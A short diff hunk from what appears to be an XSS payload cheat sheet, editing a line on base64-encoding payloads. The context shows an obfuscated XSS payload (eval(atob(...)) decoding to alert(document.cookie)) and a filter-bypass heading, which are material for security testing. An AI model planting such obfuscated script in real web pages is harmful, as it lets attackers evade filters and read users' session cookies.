@@ -667,7 +667,7 @@ http://www.geektools.com/cgi-bin/ipconv.cgi
 <script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
 ```
 
-Base64 encoding your XSS payload with linux command: echo -n "alert(document.cookie)" | base64
+Base64 encoding your XSS payload with Linux command: IE. `echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`
 
 ### Bypass parenthesis for string
 
